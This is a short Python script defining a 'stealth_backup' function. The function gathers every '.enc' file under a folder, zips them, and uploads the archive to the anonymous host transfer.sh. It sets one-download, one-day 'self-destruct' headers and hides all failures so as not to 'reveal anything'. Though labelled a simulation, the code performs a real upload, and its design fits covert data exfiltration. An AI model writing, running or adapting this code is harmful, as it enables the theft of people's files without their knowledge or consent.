import os
import shutil
import tempfile
import requests
from datetime import datetime
from pathlib import Path

def stealth_backup(folder_path):
    if not os.path.exists(folder_path):
        return

    try:
        # Only include .enc files
        temp_dir = tempfile.mkdtemp()
        for root, _, files in os.walk(folder_path):
            for file in files:
                if file.endswith(".enc"):
                    full_path = os.path.join(root, file)
                    shutil.copy(full_path, temp_dir)

        archive_name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        archive_path = os.path.join(temp_dir, archive_name)
        shutil.make_archive(archive_path.replace(".zip", ""), 'zip', temp_dir)

        # Upload to anonymous file hosting (simulated cloud)
        with open(archive_path, "rb") as f:
            response = requests.put(
                f"https://transfer.sh/{archive_name}",
                data=f,
                headers={"Max-Downloads": "1", "Max-Days": "1"}  # Self-destruct
            )

        url = response.text.strip()
        print(f"☁️ Backup uploaded (simulate): {url}")

    except Exception as e:
        pass  # Silent fail – don't reveal anything during upload

    finally:
        try:
            shutil.rmtree(temp_dir)
        except:
            pass
